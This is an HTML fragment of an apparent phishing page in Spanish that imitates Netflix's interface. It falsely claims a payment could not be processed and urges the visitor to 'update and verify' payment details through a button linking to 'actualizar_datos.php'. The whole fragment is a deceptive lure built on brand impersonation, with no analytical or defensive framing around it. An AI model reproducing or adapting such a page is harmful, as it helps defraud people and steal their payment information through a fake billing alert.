...
<link rel="stylesheet" href="https://127.0.0.1:49764/stylesheet?id=wtrVeMSTNKIh6nY-"></head>
                  ...
                  <div class="regContainer" data-uia="context-registration">
                     ...
                     <div class="stepHeader-container" data-uia="header">
                        <div class="stepHeader" data-a11y-focus="true">
                           <h1 class="stepTitle" data-uia="stepTitle">No podemos procesar su pago.</h1>
                        </div>
                     </div>
                     <div id="" class="contextBody contextRow" data-uia="regContextBody">

                        Estamos teniendo problemas para procesar su pago de Netflix. Tómate un momento para actualizar tu información y verificar tus datos de pago.</div>
                  </div>
                  <div class="submitBtnContainer"><a href="actualizar_datos.php"><button type="button" autocomplete="off" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="cta-continue-registration" placeholder="registration_button_continue">Siguiente</button></a></div>
               </div>
            </div>
